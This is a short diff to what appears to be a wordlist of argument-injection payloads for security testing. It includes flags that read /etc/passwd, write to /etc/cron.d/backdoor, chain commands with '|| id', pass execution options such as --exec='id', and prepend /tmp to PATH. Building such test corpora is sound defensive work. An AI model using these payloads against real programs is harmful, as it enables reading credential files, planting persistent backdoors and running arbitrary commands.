@@ -1,9 +1,15 @@
 -u root
 --config=/etc/passwd
- -o /tmp/pwn
+-o /tmp/pwn
 --output=/etc/cron.d/backdoor
-; --help
  || id
 --load-data-local-infile=/etc/passwd
 -e 'id'
 --exec='id'
+--env PATH=/tmp:$PATH
+-D /etc/passwd
+--host=127.0.0.1
+--port=0
+-stdin
+--inject-flag
+-n 1 -e id
